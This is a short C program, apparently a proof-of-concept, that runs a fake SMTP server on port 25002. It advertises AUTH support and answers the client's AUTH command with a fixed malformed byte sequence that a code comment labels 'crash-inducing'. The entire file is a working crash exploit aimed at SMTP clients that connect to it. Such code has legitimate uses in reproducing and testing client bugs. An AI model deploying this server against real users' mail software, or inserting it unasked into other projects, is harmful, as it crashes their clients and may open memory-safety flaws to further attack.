#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define SMTP_PORT 25002

int main()
{
    int server_fd, client_fd;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[1024] = {0};

    // Create socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
    {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Set socket options
    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)))
    {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    // Bind to port
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(SMTP_PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0)
    {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    // Listen for connections
    if (listen(server_fd, 1) < 0)
    {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    printf("Fake SMTP server listening on port %d...\n", SMTP_PORT);

    // Accept connection
    if ((client_fd = accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen)) < 0)
    {
        perror("accept");
        exit(EXIT_FAILURE);
    }

    // Send initial greeting
    const char *greeting = "220 localhost ESMTP Fake Server ready\r\n";
    send(client_fd, greeting, strlen(greeting), 0);

    // Wait for EHLO/HELO
    read(client_fd, buffer, 1024);
    printf("Received: %s", buffer);

    // Send EHLO response with AUTH capability
    const char *ehlo_response = "250-localhost\r\n250-AUTH PLAIN LOGIN\r\n250 OK\r\n";
    send(client_fd, ehlo_response, strlen(ehlo_response), 0);

    // Wait for AUTH command
    read(client_fd, buffer, 1024);
    printf("Received AUTH command: %s", buffer);

    // Send the crash-inducing response
    unsigned char crash_response[] = {0xFA, 0x00, 0xFA, 0x00, 0x00, 0xFA, 0x00, 0xFA};
    send(client_fd, crash_response, sizeof(crash_response), 0);

    // Close connections
    close(client_fd);
    close(server_fd);

    return 0;
}
